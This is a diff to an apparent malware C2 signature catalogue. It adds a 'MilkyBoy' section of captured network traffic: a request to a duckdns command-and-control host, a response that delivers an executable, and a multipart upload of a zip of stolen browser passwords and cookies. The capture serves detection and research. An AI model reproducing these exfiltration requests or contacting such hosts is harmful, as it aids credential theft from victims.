@@ -86,6 +86,51 @@ Connection: close
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/lokibot.png "Lokibot")
 
+#### MilkyBoy
+~~~
+POST / HTTP/1.1
+Cache-Control: no-cache
+Connection: Keep-Alive
+Pragma: no-cache
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Adzq41ceq52e353512hSfj
+Content-Length: 45
+Host: qqwveqwevqwe.duckdns.org:10
+
+key:Adz32151295uy129v5nqwrnvqwkjn5rv12n5vhSfjHTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 8593928
+Server: Werkzeug/0.15.4 Python/2.7.6
+Date: Wed, 09 Oct 2019 22:09:57 GMT
+
+TVqQAAMAAAAEAAAA/
+
+POST / HTTP/1.1
+Host: qqwveqwevqwe.duckdns.org:10
+Connection: keep-alive
+Accept-Encoding: gzip, deflate
+Accept: */*
+User-Agent: python-requests/2.11.1
+key: Adz32516047vhSfj
+filename: 58759853857.zip
+Content-Length: 5334
+Content-Type: multipart/form-data; boundary=80790cc2554f462cb375dcc301f5c66a
+
+--80790cc2554f462cb375dcc301f5c66a
+Content-Disposition: form-data; name="payload"; filename="payload"
+
+PK........G.IO............
+...PASSWORDS/PK........G.IO+&.6v...........e.txt=.I.. .....Wx./X....%......g[VN6A...z~......x}....xH......*b....<@.W.P..X......,|*.]$..
+}..%.	.C{....7.W......Bas.....PK........I.IO................sys.txt].Ok.@....|..S...&jho.B..........R.[.OK(..].K.2.7.73o~...'..6D.>q....U..u.. .W..x.0....=.T.#...<0"....W.k.. .;..J1.q;X.{kz..S;_.f.t...D..Gh@......Q.v@G=}....m"...............Yy..!1U...i.xe...B.T%..	{5.....m...3.>....3.J..]Vh......&Y.@.8...T~1B!....l
+kk.:......m$....B.._.E........PK........G.IO................PASSWORDS/CBase/PK........G.IO................PASSWORDS/FBase/PK........G.IO................PASSWORDS/CBase/Google/PK........G.IO).L
+........#...PASSWORDS/CBase/Google/cookies.json....PK........G.IO".......[...)...PASSWORDS/CBase/Google/loginpasswords.txt...=..r..	-N-*.IL....q,(pI,I...ON..q..O.I.q.(..M..S.....%....U.g...x...Z.sy...2......(X).r.......
+.d...V:....%...r.$.......d@|cS3...PK........G.IO."{.o...C..."...PASSWORDS/CBase/Google/webdata.txt...=..r..	-N-*.IL....q,(pI,I...ON..q..O.I.q.(..M..S.....%......&..x...V.cy..2..K..sS.....2Ss@..\>.P........b.0.PK........G.IO................PASSWORDS/FBase/Mozilla/PK........G.IOp.0.$.......$...PASSWORDS/FBase/Mozilla/cookies.json..Mk.@.....!......$......Vl$..~.......-..j-...R/s.y..}.....8..q.zm.[..n.~U..e).z..7.7..............
+...^z.6..t#....(@W.r43...U.iT.-.....%6.....1......}5......iG..Ut.i|".I....$...~...Q.yr_.....tA."..
+@.p...',.!O!e..T.v.6..T.hEY*..H..Sq)....L......~...CD....E.0..Sa.T	..`b.J*i...G..."xpF.......PK........o.)M0..W............PASSWORDS/FBase
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/milkyboy-1.png "Milkyboy 1")
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/milkyboy-2.png "Milkyboy 2")
+
 #### Nanocore
 
 flag on "38 00 00 00 17" pattern
